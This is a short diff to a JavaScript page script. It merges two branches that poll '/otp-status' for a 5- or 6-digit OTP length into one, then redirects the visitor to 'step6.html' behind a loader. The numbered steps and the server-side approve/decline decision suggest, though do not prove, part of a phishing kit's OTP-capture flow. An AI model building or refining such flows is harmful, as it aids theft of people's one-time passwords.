@@ -38,32 +38,31 @@ if (localStorage.getItem("firstProcess") === "yes") {
 }
 
 // 🔵 FLOW 2: always check for updates (OTP + decision)
+let isRedirecting = false;
+
 const checker = setInterval(async () => {
+    if (isRedirecting) return;
+
     try {
         // 🔢 CHECK OTP TYPE (5 or 6)
         const res = await fetch("/otp-status");
         const data = await res.json();
 
-        if (data.otp === 5) {
+        if (data.otp === 5 || data.otp === 6) {
+            isRedirecting = true;
             clearInterval(checker);
-            localStorage.setItem("otpLength", 5);
-            window.location.href = "step6.html";
+
+            localStorage.setItem("otpLength", data.otp);
+
+            showLoaderAndGo("step6.html");
             return;
         }
 
-        if (data.otp === 6) {
-            clearInterval(checker);
-            localStorage.setItem("otpLength", 6);
-            window.location.href = "step6.html";
-            return;
-        }
-
-        // ✅ CHECK APPROVE / DECLINE
-        
     } catch (err) {
         console.log("Waiting...");
     }
 }, 2000);
+
 function showLoaderAndGo(url) {
     document.getElementById("pageLoader").style.display = "block";
     setTimeout(() => {
